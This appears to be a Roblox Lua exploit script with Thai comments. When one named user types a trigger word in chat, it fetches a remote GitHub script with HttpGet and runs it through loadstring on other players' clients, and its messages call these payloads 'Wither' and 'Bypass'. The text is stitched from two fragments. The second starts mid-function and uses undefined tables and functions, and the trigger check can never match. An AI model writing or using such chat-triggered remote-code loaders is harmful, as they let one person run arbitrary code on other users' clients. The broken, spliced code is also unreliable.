local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TARGET_USER = "jgjkjgj4"

-- ฟังก์ชันตรวจจับแชท
local function onPlayerChatted(player)
    if player.Name == TARGET_USER then
        player.Chatted:Connect(function(message)
            if message:lower() == "Shockwave" then
                print("🔥 666 ถูกเรียกโดย "..TARGET_USER.."! กำลังปลดปล่อย Wither... 🔥")
                
                -- ป้องกันไม่ให้สคริปต์รันในตัว birdV2_123
                if LocalPlayer.Name == TARGET_USER then
                    print("🛡️ ปกป้อง "..TARGET_USER.." – ไม่รันในตัวเขา!")
                    return
                end

                -- รัน Wither ด้วย pcall (ป้องกัน crash)
                local success, err = pcall(function()
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/wino444/cityThai/refs/heads/main/Shockwave%20Sphere%20Simulator.lua"))()
                end)

                if not success then
                    warn("⚠️ Wither ล้มเหลว! Error: "..tostring(err))
                else
                    print("💀 Wither ถูกปลดปล่อยแล้ว! (ไม่กระทบ "..TARGET_USER..")")
                end
            end
        end)
    end
end

-- เช็คผู้เล่นที่มีอยู่แล้ว
for _, player in ipairs(Players:GetPlayers()) do
    onPlayerChatted(player)
end

-- รองรับผู้เล่นใหม่
Players.PlayerAdded:Connect(onPlayerChatted)

print("🕸️ สคริปต์พร้อม – ปกป้อง "..TARGET_USER.." อย่างสมบูรณ์ 🕸️")    local success, err = pcall(function()
        loadstring(game:HttpGet(url))()
    end)

    if success then
        print("✅ "..scriptName.." ถูกปลดปล่อยแล้ว!")
    else
        warn("⚠️ "..scriptName.." ล้มเหลว! Error: "..tostring(err))
    end
end

-- ดักแชท
local function onPlayerChatted(player)
    if isAuthorized(player) then
        player.Chatted:Connect(function(message)
            local cmd = message:lower()

            if SCRIPTS[cmd] then
                print("🔥 คำสั่ง '"..cmd.."' ถูกเรียกโดย "..player.Name.."!")
                runScript(SCRIPTS[cmd], cmd:upper().." Script")
            end
        end)
    end
end

-- รันกับผู้เล่นเดิม + ใหม่
for _, player in ipairs(Players:GetPlayers()) do
    onPlayerChatted(player)
end
Players.PlayerAdded:Connect(onPlayerChatted)

print("🕸️ Dual Curse พร้อม! | 666 = Wither | 777 = Bypass | สมาชิก: "..#AUTHORIZED_USERS.." คน 🕸️")
